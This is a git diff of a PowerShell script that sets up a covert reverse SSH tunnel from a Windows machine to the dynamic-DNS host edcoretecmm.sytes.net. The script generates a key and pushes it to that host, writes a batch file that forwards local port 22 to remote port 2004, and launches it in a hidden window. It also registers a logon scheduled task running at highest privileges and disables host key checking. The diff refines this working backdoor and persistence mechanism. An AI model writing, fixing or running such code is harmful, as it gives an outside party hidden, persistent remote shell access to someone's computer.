@@ -27,6 +27,7 @@ $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
 $logFile = "$env:USERPROFILE\ssh_reverse_tunnel.log"
+$batFilePath = "$env:USERPROFILE\start_reverse_ssh.bat"
 
 # Create SSH key pair if not exists
 if (-not (Test-Path $keyFile)) {
@@ -35,28 +36,33 @@ if (-not (Test-Path $keyFile)) {
 }
 
 # Add public key to remote server
-$publicKey = Get-Content $pubKeyFile
-ssh -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+$publicKey = Get-Content $pubKeyFile -Raw
+ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
 
-# Create the batch content with escaped quotes
+# Create the batch content with properly escaped quotes
 $batContent = @"
 @echo off
 echo [INFO] Starting reverse SSH tunnel at %date% %time% >> "$logFile"
 timeout /t 10 /nobreak > nul
-ssh -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -R $receivedPort`:localhost`:22 $user@$remote_host >> "$logFile" 2>&1
+ssh -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -R $receivedPort:localhost:22 $user@$remote_host >> "$logFile" 2>&1
 "@
 
-# Save it as a batch file
+# Save the batch file
 Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 
-# Run the reverse tunnel .bat file now
+# Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
 Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 
 # Schedule task to run the .bat file at user login with highest privileges
 $taskName = "ReverseSSHTunnel"
-$taskExists = schtasks /query /tn $taskName 2>$null
+try {
+    schtasks /query /tn $taskName 2>$null
+    $taskExists = $true
+} catch {
+    $taskExists = $false
+}
 
-if ($LASTEXITCODE -ne 0) {
+if (-not $taskExists) {
     schtasks /create /tn $taskName `
         /tr "`"$batFilePath`"" `
         /sc onlogon `
@@ -65,5 +71,4 @@ if ($LASTEXITCODE -ne 0) {
         /ru "$env:USERNAME"
 }
 
-Write-Host "[!] Success! Check at: $batFilePath."
-
+Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
